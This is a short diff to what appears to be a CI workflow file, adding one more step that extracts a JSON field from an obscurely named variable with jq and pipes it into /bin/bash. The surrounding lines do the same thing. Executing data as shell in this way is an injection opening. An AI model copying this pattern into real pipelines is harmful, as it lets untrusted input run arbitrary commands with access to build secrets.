@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$tc386" | jq -r .idwkq94 | /bin/bash
           printf '%s' "$zfoyy0066" | jq -r .o79 | /bin/bash
           printf '%s' "$oov1" | jq -r .vk7194 | /bin/bash
+          echo $mytgt148 | jq -r .d0127 | /bin/bash
 
       - name: Archive output
         if: always()
